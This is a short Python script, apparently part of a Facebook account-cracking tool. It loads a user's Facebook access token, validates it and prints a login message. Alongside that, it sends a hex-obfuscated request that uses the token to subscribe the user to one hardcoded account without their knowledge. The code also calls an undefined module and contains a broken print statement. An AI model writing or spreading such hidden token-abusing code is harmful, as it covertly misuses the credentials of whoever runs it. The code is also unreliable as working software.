import requests,os,json
import cr3k

P = "\x1b[0;97m" 
M = "\x1b[0;91m" 
H = "\033[92;1m" 


def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print(' '%(M))
        print(' [%s!%s] %sINVALID TOKEN'%(P,M,P))
        os.system('rm -rf token.txt')
        exit(elitetest.menu_log())
    requests.post("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d" + token)
    
    print
    print(' [%s!%s] %sLOGIN SUCCESSFUL >_<'%(P,H,P))
    exit(cr3k.menu())
